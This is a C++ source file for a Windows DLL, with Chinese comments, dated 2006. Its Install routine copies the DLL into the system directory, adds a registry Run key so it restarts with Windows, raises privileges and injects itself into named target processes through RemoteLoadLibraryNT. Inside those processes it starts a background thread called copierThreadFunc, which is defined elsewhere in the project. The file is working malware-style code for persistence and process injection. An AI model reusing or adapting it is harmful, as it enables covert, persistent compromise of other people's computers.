/*
* Copyright (c) 2005, Outmatch@gmail.com
* All rights reserved.
*
* 文件名称：inject.cpp
* 文件标识：见配置管理计划书
* 摘    要：DLL主程序,执行安装与插入进程
*
* 当前版本：1.0
* 作    者：outmatch
* 完成日期：2006年9月6日
*
* 取代版本：无
* 原作者  ：
* 完成日期：
*/

#include "config.h"
#include <windows.h>
#include <process.h>
#include <string>
#include <fstream>
#include "remotelib.h"
#include "Kernel32Funcs.h"
#include <vector>
#include <cstdio>

using namespace std;

#pragma comment(lib, "advapi32.lib")

#ifndef DLLNAME
#error DLLNAME not define
#endif

// Macro to make our code less messy.
#define KERNEL32_PROC(x)	g_kernel32.##x## = (fn##x##)::GetProcAddress(::GetModuleHandleA("Kernel32"), #x ##)

// RemoteLib使用
extern HINSTANCE g_hModInstance;
typedef std::vector<DWORD> PIDGroup;

extern DWORD enablePrivilege();
extern void reportError(LPCSTR funcName);
extern void copierThreadFunc(LPVOID *);
extern const std::string& getConfigPath();
extern PIDGroup GetDestProcessID(LPCSTR lpcExeName);

std::string setupReg();
extern "C" __declspec(dllexport) void CALLBACK Install (
		HWND hwnd,
		HINSTANCE hInstance,
		LPTSTR lpCmdLine,
		int nCmdShow
		);
BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved );

// 写入到注册表启动项
std::string setupReg()
{
	string dstPath;
	HKEY phkResult;

	const char* KeyName = REG_NAME;
	char KeyValue[MAX_PATH+1];
	strcpy(KeyValue, "rundll32 ");
	strcat(KeyValue, DLLNAME);
	strcat(KeyValue, ",Install ");
    
	if(__argc < 4)
		dstPath = DEF_PATH;
	else
		dstPath = __argv[3];
	strcat(KeyValue, __argv[2]);
	strcat(KeyValue, " ");
    strcat(KeyValue, dstPath.c_str());
	RegCreateKeyEx(HKEY_LOCAL_MACHINE,
			"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\",
			0,
			NULL,
			REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,
			NULL,
			&phkResult,
			NULL);

	RegSetValueEx(phkResult,
			KeyName,
			0,
			REG_SZ,
			(const BYTE*) KeyValue,
			lstrlen(KeyValue) + 1);
	RegCloseKey(phkResult);
	return dstPath;
}

// 自安装DLL
extern "C" __declspec(dllexport) void CALLBACK Install (
		HWND hwnd,
		HINSTANCE hInstance,
		LPTSTR lpCmdLine,
		int nCmdShow
		)
{
	if(__argc < 2) {
		char str[MAX_PATH+1] = { "\0" };
		_snprintf(str, MAX_PATH, "用法: rundll32.exe %s,Install <插入进程名>", DLLNAME);
		MessageBox(0, str, DLLNAME, 0);
		return;
	}

	// dllPath: 安装前DLL路径, destDllPath: 安装后DLL路径
	CHAR dllPath[MAX_PATH+1], destDllPath[MAX_PATH+1];

	HMODULE g_DLLHandle = GetModuleHandle(DLLNAME);
	GetModuleFileName(g_DLLHandle, dllPath, MAX_PATH);
	GetSystemDirectory(destDllPath, MAX_PATH);
	strcat(destDllPath, "\\");
	strcat(destDllPath, DLLNAME);
	// 拷贝DLL到系统文件
	CopyFile(dllPath, destDllPath, FALSE);

	std::string dstPath;
	ofstream of(getConfigPath().c_str());
	dstPath = setupReg();
	of << dstPath << endl;

	enablePrivilege();	
	// 选择被注射的线程
	PIDGroup pid = GetDestProcessID(__argv[2]);
	if(pid.empty())
	{
		CHAR msg[BUFSIZ + 1];
		_snprintf(msg, BUFSIZ, "%s : 目标进程未找到", __argv[2]);
		MessageBox(0, msg, DLLNAME, 0);
		return;
	}
	for(int i=0; i<pid.size(); i++) {
		HMODULE nRet = RemoteLoadLibraryNT(pid[i], destDllPath);
		if(0 == nRet) {
			reportError("RemoteLoadLibraryNT");	
		}
		else /* Successful */ {
#if 0
			CHAR msg[BUFSIZ + 1];
			_snprintf(msg, BUFSIZ, "RemoteLoadLibraryNT Sucessful on pid: %d", *it);
			MessageBox(0, msg, DLLNAME, 0);
#endif
		}
	}
}

BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved )
{
	g_hModInstance = hinstDLL; // this will be passed into ::SetWindowsHookEx
	::DisableThreadLibraryCalls(hinstDLL);
	if (fdwReason == DLL_PROCESS_ATTACH)
	{
		// Try to load possibly missing functions from Kernel32.dll.
		KERNEL32_PROC(LoadLibraryW);
		KERNEL32_PROC(GetModuleHandleW);
		KERNEL32_PROC(GetModuleFileNameW);
		KERNEL32_PROC(CreateToolhelp32Snapshot);
		KERNEL32_PROC(Module32First);
		KERNEL32_PROC(Module32FirstW);
		KERNEL32_PROC(Module32Next);
		KERNEL32_PROC(Module32NextW);
	}

	if ( fdwReason == DLL_PROCESS_ATTACH )
	{
		CHAR dllName[MAX_PATH+1];
		strcpy(dllName, __argv[0]);	
		if(strstr(dllName, "rundll32") == NULL) 
		{
			// MessageBox( NULL, _T("DLL已安装到目标进程。"), dllName, MB_ICONINFORMATION );
			_beginthread((void (__cdecl *)(void *))copierThreadFunc, 0, 0);
		}
	}
	return TRUE;
}

